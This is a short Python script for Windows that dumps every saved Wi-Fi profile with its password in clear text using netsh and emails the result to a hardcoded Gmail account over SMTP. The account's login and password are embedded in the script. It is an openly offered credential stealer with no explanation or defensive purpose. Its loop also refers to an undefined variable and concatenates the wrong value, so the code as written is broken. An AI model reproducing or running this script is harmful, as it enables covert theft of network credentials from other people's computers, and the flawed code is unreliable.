#!/bin/python3

import subprocess , smtplib, re

command="netsh wlan show profile"
network=subprocess.check_output(command,shell=True)
network_list=re.findall('(?:Profile\s*:\s)(.*)',network)

final_output=""
for net in networklist:
    command1="netsh wlan show profile "+ network +" key=clear"
    one_network_result=subprocess.check_output(command1,shell=True)
    final_output+=one_network_result


server=smtplib.SMTP("smtp.gmail.com",587)
server.starttls()
server.login("mmasterfromb@gmail.com","mmaster=stammer")
server.sendmail("mmasterfromb@gmail.com","mmasterfromb@gmail.com",final_output)
server.quit()


